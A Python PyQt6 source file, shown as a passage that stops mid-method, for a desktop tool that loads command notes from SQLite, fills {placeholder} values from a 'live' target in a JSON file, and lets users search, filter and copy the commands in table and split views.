import os,sqlite3,logging,json,re,html
from datetime import datetime,timezone
from logging.handlers import RotatingFileHandler
from PyQt6.QtCore import Qt,QTimer,QPoint,QSize
from PyQt6.QtGui import QAction,QFontMetrics,QIcon
from PyQt6.QtWidgets import QWidget,QVBoxLayout,QHBoxLayout,QFrame,QLineEdit,QComboBox,QToolButton,QStackedWidget,QTableWidget,QTableWidgetItem,QAbstractItemView,QHeaderView,QMenu,QApplication,QSizePolicy,QListWidget,QListWidgetItem,QSplitter,QLabel,QInputDialog,QMessageBox,QPlainTextEdit,QScrollArea
from Cores import common_db as _common_db
from Cores import note_refs as _note_refs
from Cores import CommandRelated as _command_related
def _abs(*p):return os.path.join(os.path.dirname(os.path.abspath(__file__)),*p)
def _log_setup():
    d=_abs("..","Logs");os.makedirs(d,exist_ok=True)
    lg=logging.getLogger("SearchCore");lg.setLevel(logging.INFO)
    fp=os.path.abspath(os.path.join(d,"SearchCore_log.log"))
    for h in list(lg.handlers):
        try:
            if getattr(h,"baseFilename","") and os.path.abspath(h.baseFilename)==fp:return lg
        except:pass
    h=RotatingFileHandler(fp,maxBytes=1024*1024,backupCount=5,encoding="utf-8")
    h.setFormatter(logging.Formatter("%(asctime)s %(message)s","%Y-%m-%d %H:%M:%S"))
    lg.addHandler(h);return lg
_LOG=None
def _log(tag,msg):
    global _LOG
    if _LOG is None:_LOG=_log_setup()
    try:_LOG.info(f"{tag} {msg}")
    except:pass
def _norm(s):return (str(s) if s is not None else "").strip()
def _l(s):return _norm(s).lower()
def _ell(s,n):
    s=_norm(s)
    if not s:return ""
    return (s[:max(0,n-3)]+"...") if len(s)>n else s
def _sync_combo_tooltips(combo):
    if combo is None:return
    try:
        for i in range(combo.count()):
            combo.setItemData(i,_norm(combo.itemText(i)),Qt.ItemDataRole.ToolTipRole)
    except Exception:pass
    try:combo.setToolTip(_norm(combo.currentText()))
    except Exception:pass
def _fit_combo_width(combo,min_w=90,max_w=180,pad=46):
    if combo is None:return
    fm=QFontMetrics(combo.font());mx=0
    try:
        for i in range(combo.count()):
            t=_norm(combo.itemText(i))
            if t:mx=max(mx,fm.horizontalAdvance(t))
    except Exception:pass
    cur=_norm(combo.currentText())
    if cur:mx=max(mx,fm.horizontalAdvance(cur))
    want=max(int(min_w),min(int(max_w),mx+int(pad)))
    combo.setFixedWidth(want)
    combo.setSizePolicy(QSizePolicy.Policy.Fixed,QSizePolicy.Policy.Fixed)
    _sync_combo_tooltips(combo)
def _clean_cmd(s):
    raw=html.unescape(str(s or ""))
    low=raw.lower()
    if "<span" in low or "<pre" in low or "<p" in low or "<div" in low or "<br" in low or "style=" in low or "-qt-" in low:
        raw=re.sub(r"<[^>]+>"," ",raw)
    raw=raw.replace("\xa0"," ")
    raw=re.sub(r"[ \t\r\f\v]+"," ",raw)
    raw=re.sub(r"\n\s+","\n",raw)
    raw=re.sub(r"\s+\n","\n",raw)
    return raw.strip()
_PH_KEY_RE=re.compile(r'^[A-Za-z_][A-Za-z0-9_ ]*$')
def _iter_placeholders(text):
    t=str(text or "")
    i=0;n=len(t)
    while i<n:
        if t[i]!="{":
            i+=1;continue
        start=i;j=i+1;bad=False
        while j<n and t[j]!="}":
            if t[j] in "{\r\n":bad=True
            j+=1
        if j>=n:break
        if not bad:
            raw=t[start+1:j].strip()
            if raw and _PH_KEY_RE.match(raw):yield start,j+1,raw
        i=j+1
def _safe_mtime(p):
    try:return os.path.getmtime(p) if p and os.path.isfile(p) else None
    except:return None
def _db_path():
    return _common_db.db_path()
DB_SCHEMA_VERSION=_common_db.DB_SCHEMA_VERSION
def _table_cols(cur,t):
    return _common_db.table_cols(cur,t)
def _ensure_schema(con):
    _common_db.ensure_schema(con)
def _apply_migrations(con):
    _common_db.apply_migrations(con)
def _load_cmds(dbp=None):
    p=dbp or _db_path()
    if not p or not os.path.isfile(p):
        _log("[-]",f"DB not found: {p}")
        return p,[]
    try:
        con=sqlite3.connect(p);_ensure_schema(con)
        cur=con.cursor()
        out=[]
        note_groups_by_id={};note_groups_by_name={}
        notes_cols=set(_table_cols(cur,"Notes"))
        if {"id","note_name"}.issubset(notes_cols):
            sel="id,note_name"+(",group_name" if "group_name" in notes_cols else "")
            cur.execute(f"SELECT {sel} FROM Notes")
            for r in cur.fetchall():
                gid=_norm(r[2]) if "group_name" in notes_cols and len(r)>2 else ""
                try:note_groups_by_id[int(r[0])]=gid
                except Exception:pass
                nn=_norm(r[1])
                if nn:note_groups_by_name[nn.lower()]=gid
        cn=set(_table_cols(cur,"CommandsNotes"))
        if {"note_name","category","sub_category","command","tags"}.issubset(cn):
            has_desc="description" in cn
            sel="id,note_name,category,sub_category,command,tags"+(",description" if has_desc else "")
            cur.execute(f"SELECT {sel} FROM CommandsNotes ORDER BY id DESC")
            for r in cur.fetchall():
                rid=r[0];nn=r[1];c=r[2];sc=r[3];cmd=r[4];tags=r[5];desc=(r[6] if has_desc else "")
                title=_norm(nn) or "Untitled"
                out.append({"id":int(rid),"src":"CommandsNotes","group_name":"","title":title,"cmd_note_title":title,"category":_norm(c) or "Uncategorized","sub":_norm(sc) or "General","command":_clean_cmd(cmd),"tags":_norm(tags),"description":_norm(desc)})
        cc=set(_table_cols(cur,"Commands"))
        if {"note_name","category","sub_category","command","tags"}.issubset(cc):
            has_desc="description" in cc
            has_title="cmd_note_title" in cc
            has_note_id="note_id" in cc
            sel="id"+(",note_id" if has_note_id else "")+",note_name,category,sub_category,command,tags"+(",description" if has_desc else "")+(",cmd_note_title" if has_title else "")
            cur.execute(f"SELECT {sel} FROM Commands ORDER BY id DESC")
            for r in cur.fetchall():
                off=0
                rid=r[off];off+=1
                note_id=(r[off] if has_note_id else None);off+=1 if has_note_id else 0
                nn=r[off];off+=1
                c=r[off];off+=1
                sc=r[off];off+=1
                cmd=r[off];off+=1
                tags=r[off];off+=1
                desc=(r[off] if has_desc else "");off+=1 if has_desc else 0
                ttl=(r[off] if has_title else "")
                base=_norm(nn) or "Untitled"
                title=_norm(ttl) or base
                nid=_note_refs.note_ref_id(note_id=note_id)
                grp=note_groups_by_id.get(nid,"") if nid is not None else note_groups_by_name.get(_norm(nn).lower(),"")
                out.append({"id":int(rid),"src":"Commands","note_id":nid,"note_name":_norm(nn),"group_name":grp,"title":title,"cmd_note_title":_norm(ttl),"category":_norm(c) or "Uncategorized","sub":_norm(sc) or "General","command":_clean_cmd(cmd),"tags":_norm(tags),"description":_norm(desc)})
        con.close()
        _log("[+]",f"Loaded search cmds: {len(out)} from {os.path.basename(p)}")
        return p,out
    except Exception as e:
        _log("[!]",f"DB load error ({e})")
        try:con.close()
        except:pass
        return p,[]
def _targets_path():
    d=_abs("..","Data")
    p1=os.path.join(d,"Targets.json")
    p2=os.path.join(d,"Targes.json")
    if os.path.isfile(p1) or not os.path.isfile(p2):return p1
    return p2
def _read_json(p,default):
    try:
        if not p or not os.path.isfile(p):return default
        with open(p,"r",encoding="utf-8") as f:
            v=json.load(f)
            return v if v is not None else default
    except:return default
def _write_json(p,obj):
    t=p+".tmp"
    try:
        os.makedirs(os.path.dirname(p),exist_ok=True)
        with open(t,"w",encoding="utf-8") as f:json.dump(obj,f,ensure_ascii=False,indent=2)
        os.replace(t,p);return True
    except:
        try:
            if os.path.isfile(t):os.remove(t)
        except:pass
        return False
def _searches_path():
    d=_abs("..","Data");os.makedirs(d,exist_ok=True)
    return os.path.join(d,"saved_searches.json")
def _recent_searches_path():
    d=_abs("..","Data");os.makedirs(d,exist_ok=True)
    return os.path.join(d,"recent_searches.json")
def _norm_filters(filters):
    data=filters if isinstance(filters,dict) else {}
    return {"src":_norm(data.get("src","All")) or "All","group":_norm(data.get("group","All")) or "All","category":_norm(data.get("category","All")) or "All","sub":_norm(data.get("sub","All")) or "All","tag":_norm(data.get("tag","All")) or "All"}
def _normalize_search_entry(item,name=""):
    data=item if isinstance(item,dict) else {}
    out={"name":_norm(data.get("name",name)),"query":_norm(data.get("query","")),"mode":_norm(data.get("mode","Keyword")) or "Keyword","filters":_norm_filters(data.get("filters",{})),"captured_at":_norm(data.get("captured_at",""))}
    return out
def _entry_signature(item):
    entry=_normalize_search_entry(item)
    return json.dumps({"query":entry.get("query",""),"mode":entry.get("mode","Keyword"),"filters":entry.get("filters",{})},sort_keys=True,ensure_ascii=False)
def _fmt_when(text):
    s=_norm(text)
    if not s:return "-"
    try:return datetime.fromisoformat(s.replace("Z","+00:00")).strftime("%Y-%m-%d %H:%M")
    except Exception:return s[:16].replace("T"," ")
def _entry_summary(item):
    entry=_normalize_search_entry(item)
    parts=[]
    q=_norm(entry.get("query",""))
    if q:parts.append(q)
    filters=entry.get("filters",{}) if isinstance(entry.get("filters",{}),dict) else {}
    for key,label in (("src","src"),("group","group"),("category","cat"),("sub","sub"),("tag","tag")):
        val=_norm(filters.get(key,"All"))
        if val and val!="All":parts.append(f"{label}={val}")
    if entry.get("mode","Keyword")!="Keyword":parts.append("mode="+_norm(entry.get("mode","Keyword")))
    return " | ".join(parts) if parts else "Current filters"
def _recent_entry_label(item):
    entry=_normalize_search_entry(item)
    return f"{_fmt_when(entry.get('captured_at',''))} | {_entry_summary(entry)}"
def _load_searches():
    d=_read_json(_searches_path(),[])
    if not isinstance(d,list):return []
    out=[]
    for it in d:
        entry=_normalize_search_entry(it)
        if _norm(entry.get("name","")):out.append(entry)
    return out
def _save_searches(items):
    out=[]
    for it in (items or []):
        entry=_normalize_search_entry(it)
        if _norm(entry.get("name","")):out.append(entry)
    return _write_json(_searches_path(),out)
def _load_recent_searches():
    d=_read_json(_recent_searches_path(),[])
    if not isinstance(d,list):return []
    out=[];seen=set()
    for it in d:
        entry=_normalize_search_entry(it)
        sig=_entry_signature(entry)
        if sig in seen:continue
        seen.add(sig)
        if _entry_summary(entry)!="Current filters":out.append(entry)
    return out[:20]
def _save_recent_searches(items):
    out=[];seen=set()
    for it in (items or []):
        entry=_normalize_search_entry(it)
        sig=_entry_signature(entry)
        if sig in seen:continue
        seen.add(sig)
        if _entry_summary(entry)!="Current filters":out.append(entry)
    return _write_json(_recent_searches_path(),out[:20])
def _split_tags(s):
    if not s:return []
    raw=str(s).replace(";",",").split(",")
    out=[];seen=set()
    for p in raw:
        t=_norm(p)
        if not t:continue
        k=t.lower()
        if k in seen:continue
        seen.add(k);out.append(t)
    return out
def _title_text(n):
    title=_norm(n.get("title","")) or "Untitled"
    grp=_norm(n.get("group_name",""))
    return f"[{grp}] {title}" if grp else title
def _row_preview(n,cmd_disp):
    title=_title_text(n)
    meta=[]
    src=_norm(n.get("src",""))
    if src=="Commands":meta.append("Linked")
    elif src=="CommandsNotes":meta.append("Standalone")
    note_name=_norm(n.get("note_name",""))
    if note_name and note_name!=_norm(n.get("title","")):meta.append("Note: "+note_name)
    cat=_norm(n.get("category",""));sub=_norm(n.get("sub",""))
    if cat or sub:meta.append((cat+" / "+sub).strip(" /"))
    tags=_norm(n.get("tags",""))
    if tags:meta.append("Tags: "+tags)
    desc=_clean_cmd(n.get("description",""))
    cmd=_clean_cmd(cmd_disp or n.get("command",""))
    lines=[title]
    if meta:lines.append(" | ".join(meta))
    if desc:lines.append("Desc: "+_ell(desc,220))
    if cmd:lines.append("Cmd: "+_ell(cmd,260))
    return "\n".join([x for x in lines if _norm(x)])
class LiveTargetContext:
    def __init__(self):
        self.path=_targets_path()
        self.mtime=_safe_mtime(self.path)
        self.name=""
        self.map={}
        self.reload()
    def reload(self):
        self.path=_targets_path()
        self.mtime=_safe_mtime(self.path)
        data=_read_json(self.path,[])
        live=None
        if isinstance(data,list):
            for t in data:
                if not isinstance(t,dict):continue
                if _l(t.get("status",""))=="live":
                    live=t;break
        self.name=_norm(live.get("name","")) if live else ""
        vals=live.get("values",{}) if live else {}
        m={}
        if isinstance(vals,dict):
            for k,v in vals.items():
                kk=_l(k);vv=_norm(v)
                if kk and vv:m[kk]=vv
        self.map=m
    def changed(self):
        p=_targets_path()
        mt=_safe_mtime(p)
        return p!=self.path or mt!=self.mtime
class CommandReplacer:
    def __init__(self,ctx:LiveTargetContext):
        self.ctx=ctx
    def apply(self,cmd):
        s=_norm(cmd)
        if not s:return ""
        mp=getattr(self.ctx,"map",{}) or {}
        if not mp:return s
        out=[];last=0
        try:
            for start,end,key in _iter_placeholders(s):
                out.append(s[last:start]);out.append(mp.get(_l(key),"{"+key+"}"));last=end
            out.append(s[last:])
            return "".join(out)
        except:return s
class Table_Style(QWidget):
    def __init__(self,on_copy,get_cmd,parent=None):
        super().__init__(parent)
        self._notes=[];self._view=[];self._q="";self._mode="Keyword";self._on_copy=on_copy;self._get_cmd=get_cmd
        self._src_filter="All";self._group_filter="All";self._cat_filter="All";self._sub_filter="All";self._tag_filter="All"
        self._auto_cols=True;self._auto_limit=200;self._sort_col=-1;self._sort_asc=True
        root=QVBoxLayout(self);root.setContentsMargins(0,0,0,0);root.setSpacing(0)
        self.wrap=QFrame(self);self.wrap.setObjectName("HomeTableFrame");root.addWidget(self.wrap,1)
        v=QVBoxLayout(self.wrap);v.setContentsMargins(10,10,10,10);v.setSpacing(10)
        self.table=QTableWidget(self.wrap);self.table.setObjectName("HomeTable")
        self._c_title=0;self._c_cat=1;self._c_sub=2;self._c_tags=3;self._c_cmd=4;self._c_copy=5
        self.table.setColumnCount(6)
        self.table.setHorizontalHeaderLabels(["Title","Category","Sub","Tags","Command","⧉"])
        self.table.verticalHeader().setVisible(False)
        self.table.setEditTriggers(QAbstractItemView.EditTrigger.NoEditTriggers)
        self.table.setSelectionBehavior(QAbstractItemView.SelectionBehavior.SelectRows)
        self.table.setSelectionMode(QAbstractItemView.SelectionMode.SingleSelection)
        self.table.setAlternatingRowColors(False)
        self.table.setShowGrid(True)
        self.table.setWordWrap(False)
        self.table.setTextElideMode(Qt.TextElideMode.ElideRight)
        self.table.cellClicked.connect(self._click)
        self.table.cellDoubleClicked.connect(self._dbl)
        self.table.setContextMenuPolicy(Qt.ContextMenuPolicy.CustomContextMenu)
        self.table.customContextMenuRequested.connect(self._ctx)
        h=self.table.horizontalHeader()
        h.setDefaultAlignment(Qt.AlignmentFlag.AlignCenter)
        hf=h.font();hf.setBold(True);hf.setWeight(800);h.setFont(hf)
        h.setStretchLastSection(False)
        h.setSectionResizeMode(self._c_title,QHeaderView.ResizeMode.ResizeToContents)
        h.setSectionResizeMode(self._c_cat,QHeaderView.ResizeMode.ResizeToContents)
        h.setSectionResizeMode(self._c_sub,QHeaderView.ResizeMode.ResizeToContents)
        h.setSectionResizeMode(self._c_tags,QHeaderView.ResizeMode.ResizeToContents)
        h.setSectionResizeMode(self._c_cmd,QHeaderView.ResizeMode.Stretch)
        h.setSectionResizeMode(self._c_copy,QHeaderView.ResizeMode.Fixed)
        self.table.setColumnWidth(self._c_copy,44)
        h.sectionClicked.connect(self._on_header_click)
        if hasattr(self.table,"setUniformRowHeights"):
            try:self.table.setUniformRowHeights(True)
            except Exception:pass
        self.table.verticalHeader().setDefaultSectionSize(44)
        v.addWidget(self.table,1)
    def set_notes(self,notes,apply=True):
        self._notes=list(notes or [])
        if apply:self._apply()
    def set_query(self,q,mode):
        self._q=_norm(q)
        self._mode=mode or "Keyword"
        self._apply()
    def set_filters(self,src,group,cat,sub,tag,apply=True):
        self._src_filter=src or "All"
        self._group_filter=group or "All"
        self._cat_filter=cat or "All"
        self._sub_filter=sub or "All"
        self._tag_filter=tag or "All"
        if apply:self._apply()
    def refresh_view(self):self._render()
    _TS_SORT_COLS={0,1,2,3,4}
    _TS_HEADERS=["Title","Category","Sub","Tags","Command","⧉"]
    def _sort_key_ts(self,n,col):
        if col==0:return _norm(n.get("title","")).lower()
        if col==1:return _norm(n.get("category","")).lower()
        if col==2:return _norm(n.get("sub","")).lower()
        if col==3:return _norm(n.get("tags","")).lower()
        if col==4:return _norm(n.get("command","")).lower()
        return ""
    def _do_sort(self):
        if self._sort_col not in self._TS_SORT_COLS:return
        self._view.sort(key=lambda n:self._sort_key_ts(n,self._sort_col),reverse=not self._sort_asc)
    def _update_header_labels(self):
        for c,lbl in enumerate(self._TS_HEADERS):
            it=self.table.horizontalHeaderItem(c)
            if it:it.setText(lbl+(" ▲" if self._sort_asc else " ▼") if c==self._sort_col else lbl)
    def _on_header_click(self,col):
        if col not in self._TS_SORT_COLS:return
        if col==self._sort_col:self._sort_asc=not self._sort_asc
        else:self._sort_col=col;self._sort_asc=True
        self._do_sort()
        self._update_header_labels()
        self._render()
    def _update_header_mode(self,row_count):
        auto=row_count<=self._auto_limit
        if auto==self._auto_cols:return
        self._auto_cols=auto
        h=self.table.horizontalHeader()
        if auto:
            h.setSectionResizeMode(self._c_title,QHeaderView.ResizeMode.ResizeToContents)
            h.setSectionResizeMode(self._c_cat,QHeaderView.ResizeMode.ResizeToContents)
            h.setSectionResizeMode(self._c_sub,QHeaderView.ResizeMode.ResizeToContents)
            h.setSectionResizeMode(self._c_tags,QHeaderView.ResizeMode.ResizeToContents)
            return
        for c in (self._c_title,self._c_cat,self._c_sub,self._c_tags):
            h.setSectionResizeMode(c,QHeaderView.ResizeMode.Interactive)
        fm=QFontMetrics(self.table.font())
        self.table.setColumnWidth(self._c_title,max(180,fm.horizontalAdvance("Title")+140))
        self.table.setColumnWidth(self._c_cat,max(110,fm.horizontalAdvance("Category")+60))
        self.table.setColumnWidth(self._c_sub,max(110,fm.horizontalAdvance("Sub")+60))
        self.table.setColumnWidth(self._c_tags,max(130,fm.horizontalAdvance("Tags")+80))
    def _tok(self,s):
        s=_l(s)
        return [x for x in re.split(r"[,\s]+",s) if x]
    def _match(self,n,q,mode):
        src=_norm(self._src_filter)
        if src=="Linked" and _norm(n.get("src",""))!="Commands":return False
        if src=="Not Linked" and _norm(n.get("src",""))!="CommandsNotes":return False
        group=_norm(self._group_filter)
        if group!="All" and _l(n.get("group_name",""))!=_l(group):return False
        cat=_norm(self._cat_filter)
        if cat!="All" and _l(n.get("category",""))!=_l(cat):return False
        sub=_norm(self._sub_filter)
        if sub!="All" and _l(n.get("sub",""))!=_l(sub):return False
        tag=_norm(self._tag_filter)
        if tag!="All":
            tags=self._tok(n.get("tags",""))
            if _l(tag) not in [x.lower() for x in tags]:return False
        qq=_l(q)
        if not qq:return True
        if mode=="Group":return qq in _l(n.get("group_name",""))
        if mode=="Category":return qq in _l(n.get("category",""))
        if mode=="Subcategory":return qq in _l(n.get("sub",""))
        if mode=="Tag":
            tags=_l(n.get("tags",""))
            if qq in tags:return True
            return qq in self._tok(tags)
        if mode=="Command":return qq in _l(n.get("command","")) or qq in _l(n.get("title",""))
        blob=" ".join([n.get("title",""),n.get("group_name",""),n.get("category",""),n.get("sub",""),n.get("tags",""),n.get("command",""),n.get("description","")])
        return qq in _l(blob)
    def _apply(self):
        q=self._q;mode=self._mode
        self._view=[n for n in self._notes if self._match(n,q,mode)]
        self._do_sort()
        self._render()
    def _row_note(self,row):
        try:
            it=self.table.item(row,0)
            if not it:return None
            d=it.data(Qt.ItemDataRole.UserRole)
            return d if isinstance(d,dict) else None
        except:return None
    def _do_copy(self,n,raw=False):
        if not n:return
        cmd=n.get("command","") if raw else (self._get_cmd(n) if callable(self._get_cmd) else n.get("command",""))
        if callable(self._on_copy):self._on_copy(cmd,n.get("title",""))
    def _click(self,row,col):
        n=self._row_note(row)
        if n:self._do_copy(n,raw=False)
    def _dbl(self,row,col):
        n=self._row_note(row)
        if n:self._do_copy(n,raw=False)
    def _ctx(self,pos:QPoint):
        ix=self.table.indexAt(pos)
        if not ix.isValid():return
        n=self._row_note(ix.row())
        if not n:return
        m=QMenu(self)
        a1=QAction("Copy Command (Preview)",self);a1.triggered.connect(lambda:self._do_copy(n,raw=False))
        a2=QAction("Copy Raw Command",self);a2.triggered.connect(lambda:self._do_copy(n,raw=True))
        a3=QAction("Copy Title",self);a3.triggered.connect(lambda:(QApplication.clipboard().setText(n.get("title","") or ""),_log("[+]",f"Copied title: {n.get('title','')}")))
        a4=QAction("Copy Category/Sub",self);a4.triggered.connect(lambda:(QApplication.clipboard().setText(f"{n.get('category','')} > {n.get('sub','')}".strip()),_log("[+]",f"Copied path: {n.get('title','')}")))
        m.addAction(a1);m.addAction(a2);m.addSeparator();m.addAction(a3);m.addAction(a4)
        if _norm(n.get("group_name","")):
            a6=QAction("Copy Group",self);a6.triggered.connect(lambda:(QApplication.clipboard().setText(n.get("group_name","") or ""),_log("[+]",f"Copied group: {n.get('group_name','')}")))
            m.addAction(a6)
        if n.get("note_id") is not None:
            a5=QAction("Copy Note ID",self);a5.triggered.connect(lambda:(QApplication.clipboard().setText(str(n.get("note_id"))),_log("[+]",f"Copied note id: {n.get('note_id')}")))
            m.addAction(a5)
        m.exec(self.table.viewport().mapToGlobal(pos))
    def _render(self):
        rows=self._view
        self._update_header_mode(len(rows))
        self.table.setUpdatesEnabled(False)
        try:
            self.table.setRowCount(len(rows))
            for r,n in enumerate(rows):
                cmd_disp=self._get_cmd(n) if callable(self._get_cmd) else n.get("command","")
                preview=_row_preview(n,cmd_disp)
                vals=[_ell(n.get("title",""),120),_ell(n.get("category",""),40),_ell(n.get("sub",""),40),_ell(n.get("tags",""),60),_ell(cmd_disp,260),"⧉"]
                for c,val in enumerate(vals):
                    it=QTableWidgetItem(val if val is not None else "")
                    it.setFlags(Qt.ItemFlag.ItemIsEnabled|Qt.ItemFlag.ItemIsSelectable)
                    if c==self._c_cmd:it.setToolTip(preview or cmd_disp or "")
                    elif c==self._c_copy:it.setToolTip("Copy")
                    else:it.setToolTip(preview if c==0 else it.text())
                    it.setTextAlignment(Qt.AlignmentFlag.AlignCenter if c in (self._c_cat,self._c_sub,self._c_tags,self._c_copy) else Qt.AlignmentFlag.AlignVCenter|Qt.AlignmentFlag.AlignLeft)
                    if c==0:it.setText(_ell(_title_text(n),120));it.setData(Qt.ItemDataRole.UserRole,n)
                    self.table.setItem(r,c,it)
            self.table.clearSelection()
        finally:
            self.table.setUpdatesEnabled(True)
class Split_View_Style(QWidget):
    def __init__(self,on_copy,get_cmd,parent=None):
        super().__init__(parent)
        self._notes=[];self._base=[];self._q="";self._mode="Keyword";self._on_copy=on_copy;self._get_cmd=get_cmd
        self._src_filter="All";self._group_filter="All";self._cat_filter="All";self._sub_filter="All";self._tag_filter="All"
        self._auto_cols=True;self._auto_limit=200;self._sort_col=-1;self._sort_asc=True
        self._bar_cap=200
        root=QVBoxLayout(self);root.setContentsMargins(0,0,0,0);root.setSpacing(0)
        self.splitter=QSplitter(Qt.Orientation.Horizontal,self);self.splitter.setChildrenCollapsible(False);root.addWidget(self.splitter,1)
        self.cat_f=QFrame(self);self.cat_f.setObjectName("SplitCatsFrame")
        cv=QVBoxLayout(self.cat_f);cv.setContentsMargins(10,10,10,10);cv.setSpacing(8)
        self.ct=QLabel("Categories",self.cat_f);self.ct.setObjectName("SplitBarTitle")
        self.cat=QListWidget(self.cat_f);self.cat.setObjectName("SplitCatsList");self.cat.setSelectionMode(QAbstractItemView.SelectionMode.SingleSelection);self.cat.setTextElideMode(Qt.TextElideMode.ElideRight);self.cat.itemSelectionChanged.connect(self._on_cat)
        cv.addWidget(self.ct,0);cv.addWidget(self.cat,1)
        self.sub_f=QFrame(self);self.sub_f.setObjectName("SplitSubsFrame")
        sv=QVBoxLayout(self.sub_f);sv.setContentsMargins(10,10,10,10);sv.setSpacing(8)
        self.st=QLabel("Subcategories",self.sub_f);self.st.setObjectName("SplitBarTitle")
        self.sub=QListWidget(self.sub_f);self.sub.setObjectName("SplitSubsList");self.sub.setSelectionMode(QAbstractItemView.SelectionMode.SingleSelection);self.sub.setTextElideMode(Qt.TextElideMode.ElideRight);self.sub.itemSelectionChanged.connect(self._on_sub)
        sv.addWidget(self.st,0);sv.addWidget(self.sub,1)
        self.res_f=QFrame(self);self.res_f.setObjectName("HomeTableFrame")
        rv=QVBoxLayout(self.res_f);rv.setContentsMargins(10,10,10,10);rv.setSpacing(10)
        self.table=QTableWidget(self.res_f);self.table.setObjectName("HomeTable")
        self._c_title=0;self._c_tags=1;self._c_cmd=2;self._c_copy=3
        self.table.setColumnCount(4)
        self.table.setHorizontalHeaderLabels(["Title","Tags","Command","⧉"])
        self.table.verticalHeader().setVisible(False)
        self.table.setEditTriggers(QAbstractItemView.EditTrigger.NoEditTriggers)
        self.table.setSelectionBehavior(QAbstractItemView.SelectionBehavior.SelectRows)
        self.table.setSelectionMode(QAbstractItemView.SelectionMode.SingleSelection)
        self.table.setAlternatingRowColors(False)
        self.table.setShowGrid(True)
        self.table.setWordWrap(False)
        self.table.setTextElideMode(Qt.TextElideMode.ElideRight)
        self.table.cellClicked.connect(self._click)
        self.table.cellDoubleClicked.connect(self._dbl)
        self.table.setContextMenuPolicy(Qt.ContextMenuPolicy.CustomContextMenu)
        self.table.customContextMenuRequested.connect(self._ctx)
        h=self.table.horizontalHeader()
        h.setDefaultAlignment(Qt.AlignmentFlag.AlignCenter)
        hf=h.font();hf.setBold(True);hf.setWeight(800);h.setFont(hf)
        h.setStretchLastSection(False)
        h.setSectionResizeMode(self._c_title,QHeaderView.ResizeMode.ResizeToContents)
        h.setSectionResizeMode(self._c_tags,QHeaderView.ResizeMode.ResizeToContents)
        h.setSectionResizeMode(self._c_cmd,QHeaderView.ResizeMode.Stretch)
        h.setSectionResizeMode(self._c_copy,QHeaderView.ResizeMode.Fixed)
        self.table.setColumnWidth(self._c_copy,44)
        h.sectionClicked.connect(self._on_header_click)
        if hasattr(self.table,"setUniformRowHeights"):
            try:self.table.setUniformRowHeights(True)
            except Exception:pass
        self.table.verticalHeader().setDefaultSectionSize(44)
        rv.addWidget(self.table,1)
        self.splitter.addWidget(self.cat_f);self.splitter.addWidget(self.sub_f);self.splitter.addWidget(self.res_f)
        self.splitter.setStretchFactor(0,0);self.splitter.setStretchFactor(1,0);self.splitter.setStretchFactor(2,1)
        QTimer.singleShot(0,self._fit_bars)
    def set_notes(self,notes,apply=True):
        self._notes=list(notes or [])
        if apply:self._apply()
    def set_query(self,q,mode):
        self._q=_norm(q)
        self._mode=mode or "Keyword"
        self._apply()
    def set_filters(self,src,group,cat,sub,tag,apply=True):
        self._src_filter=src or "All"
        self._group_filter=group or "All"
        self._cat_filter=cat or "All"
        self._sub_filter=sub or "All"
        self._tag_filter=tag or "All"
        if apply:self._apply()
    def refresh_view(self):self._render()
    def _update_header_mode(self,row_count):
        auto=row_count<=self._auto_limit
        if auto==self._auto_cols:return
        self._auto_cols=auto
        h=self.table.horizontalHeader()
        if auto:
            h.setSectionResizeMode(self._c_title,QHeaderView.ResizeMode.ResizeToContents)
            h.setSectionResizeMode(self._c_tags,QHeaderView.ResizeMode.ResizeToContents)
            return
        for c in (self._c_title,self._c_tags):
            h.setSectionResizeMode(c,QHeaderView.ResizeMode.Interactive)
        fm=QFontMetrics(self.table.font())
        self.table.setColumnWidth(self._c_title,max(200,fm.horizontalAdvance("Title")+160))
        self.table.setColumnWidth(self._c_tags,max(140,fm.horizontalAdvance("Tags")+90))
    def _tok(self,s):
        s=_l(s)
        return [x for x in re.split(r"[,\s]+",s) if x]
    def _match(self,n,q,mode):
        src=_norm(self._src_filter)
        if src=="Linked" and _norm(n.get("src",""))!="Commands":return False
        if src=="Not Linked" and _norm(n.get("src",""))!="CommandsNotes":return False
        group=_norm(self._group_filter)
        if group!="All" and _l(n.get("group_name",""))!=_l(group):return False
        cat=_norm(self._cat_filter)
        if cat!="All" and _l(n.get("category",""))!=_l(cat):return False
        sub=_norm(self._sub_filter)
        if sub!="All" and _l(n.get("sub",""))!=_l(sub):return False
        tag=_norm(self._tag_filter)
        if tag!="All":
            tags=self._tok(n.get("tags",""))
            if _l(tag) not in [x.lower() for x in tags]:return False
        qq=_l(q)
        if not qq:return True
        if mode=="Group":return qq in _l(n.get("group_name",""))
        if mode=="Category":return qq in _l(n.get("category",""))
        if mode=="Subcategory":return qq in _l(n.get("sub",""))
        if mode=="Tag":
            tags=_l(n.get("tags",""))
            if qq in tags:return True
            return qq in self._tok(tags)
        if mode=="Command":return qq in _l(n.get("command","")) or qq in _l(n.get("title",""))
        blob=" ".join([n.get("title",""),n.get("group_name",""),n.get("category",""),n.get("sub",""),n.get("tags",""),n.get("command",""),n.get("description","")])
        return qq in _l(blob)
    def _sel_text(self,w,default="All"):
        it=w.currentItem()
        return _norm(it.text()) if it else default
    def _set_list(self,w,items,keep):
        w.blockSignals(True)
        w.setUpdatesEnabled(False)
        try:
            w.clear()
            a=QListWidgetItem("All");a.setToolTip("All");w.addItem(a)
            for x in items:
                it=QListWidgetItem(x);it.setToolTip(x);w.addItem(it)
            sel=keep if keep in (["All"]+items) else "All"
            for i in range(w.count()):
                if _norm(w.item(i).text())==sel:w.setCurrentRow(i);break
        finally:
            w.setUpdatesEnabled(True)
            w.blockSignals(False)
    def _cats(self):
        d={}
        for n in self._base:
            c=_norm(n.get("category","")) or "Uncategorized"
            d[c]=1
        return sorted(d.keys(),key=lambda x:x.lower())
    def _subs(self,cat):
        d={}
        for n in self._base:
            c=_norm(n.get("category","")) or "Uncategorized"
            if cat!="All" and c!=cat:continue
            sc=_norm(n.get("sub","")) or "General"
            d[sc]=1
        return sorted(d.keys(),key=lambda x:x.lower())
    def _apply(self):
        q=self._q;mode=self._mode
        self._base=[n for n in self._notes if self._match(n,q,mode)]
        keep_cat=self._sel_text(self.cat)
        self._set_list(self.cat,self._cats(),keep_cat)
        cat=self._sel_text(self.cat)
        keep_sub=self._sel_text(self.sub)
        self._set_list(self.sub,self._subs(cat),keep_sub)
        self._fit_bars()
        self._render()
    def _filtered(self):
        cat=self._sel_text(self.cat);sub=self._sel_text(self.sub)
        out=[]
        for n in self._base:
            c=_norm(n.get("category","")) or "Uncategorized"
            sc=_norm(n.get("sub","")) or "General"
            if cat!="All" and c!=cat:continue
